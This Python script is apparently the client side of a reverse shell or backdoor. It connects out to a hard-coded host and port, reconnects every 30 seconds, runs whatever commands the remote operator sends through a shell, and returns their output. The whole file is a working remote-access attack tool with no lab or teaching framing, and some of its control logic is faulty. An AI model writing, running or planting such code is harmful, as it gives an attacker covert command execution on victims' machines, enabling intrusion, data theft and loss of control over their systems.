import socket as s
from subprocess import check_output
from time import sleep
from sys import exit

HOST = "10.0.0.5"
PORT = 420
BUFFER = 1024
FORMAT = "cp850"
ADDR = (HOST, PORT)

client = s.socket(s.AF_INET, s.SOCK_STREAM)
connect = lambda: client.connect(ADDR)


def connector():
    try:
        connect()
        recvMsg()
    except ConnectionRefusedError:
        sleep(30)
        connector()


def sendMsg(msg):
    sendLength = str(len(msg)).encode("utf-8")
    client.send(sendLength)

    client.send(msg.encode(FORMAT))
    recvMsg()


def process(message):
    ctype = message[0]
    messageLst = message.split(" ")

    if ctype == "p":
        check_output(messageLst, shell=True).decode(FORMAT)
        recvMsg()
    elif ctype == "c":
        messageLst.pop(0)
        comm = check_output(messageLst, shell=True).decode(FORMAT)
        sendMsg(comm)

    elif ctype == "f":
        pass

    else:
        if messageLst == "!dsc":
            client.close()
            exit()


def recvMsg():
    try:
        msgLen = int(client.recv(BUFFER).decode(FORMAT))

        if msgLen:
            msg = client.recv(int(msgLen)).decode(FORMAT)
            process(msg)
    except ConnectionResetError:
        connector()


connector()
